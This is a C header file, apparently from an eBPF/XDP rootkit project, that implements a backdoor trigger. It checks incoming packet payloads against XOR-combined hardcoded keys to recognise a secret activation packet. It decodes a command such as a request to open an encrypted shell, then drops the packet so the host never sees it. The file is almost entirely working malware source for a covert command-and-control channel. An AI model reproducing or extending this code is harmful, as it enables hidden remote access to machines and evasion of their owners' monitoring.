#ifndef __BPF_BACKDOOR
#define __BPF_BACKDOOR

#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include "../../common/c&c.h"

static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size){
    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN]; 
    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result1[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];

    //Undoing the trigger secret packet to check it is the one expected

    //Loading keys
    __builtin_memcpy(key1, CC_TRIGGER_SYN_PACKET_KEY_1, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(key2, CC_TRIGGER_SYN_PACKET_KEY_2, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    //S1 XOR K1
    __builtin_memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result1[ii] = section[ii] ^ section2[ii];
        if(result1[ii]!=key1[ii]){
            bpf_printk("FAIL CHECK 1\n");
            return XDP_PASS;
        }
    }

    //S2 XOR K2
    __builtin_memcpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result2[ii] = section[ii] ^ section2[ii];
        if(result2[ii]!=key2[ii]){
            bpf_printk("FAIL CHECK 2\n");
            return XDP_PASS;
        }
    }

    //S1 XOR K1 XOR S2 XOR K2 XOR (K3+COMMAND VALUE)
    __builtin_memcpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section3, payload+0x0C, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    int correct = 1;
    int command_received = -1;
    for(int jj=0; jj<CC_PROT_K3_TOTAL_DEFINED_KEYS_V1; jj++){
        for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
            result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
            if(result3[ii]!=(key3[ii] + jj)){
                correct = 0;
            }
        }
        if(correct == 1){
            //Found valid k3 value
            command_received = jj;
            break;
        }
        
    }
    if(correct == 0){
        bpf_printk("FAIL CHECK 3\n");
        return XDP_PASS;
    }

    //If we reach this point then we received trigger packet
    bpf_printk("Finished backdoor V1 check with success\n");
    switch(command_received){
        case CC_PROT_K3_ENCRYPTED_SHELL_TRIGGER_V1:
            bpf_printk("Received request to start encrypted connection\n");
            break;
        default:
            bpf_printk("Command received unknown: %d\n", command_received);
    }


    return XDP_DROP; 



}

#endif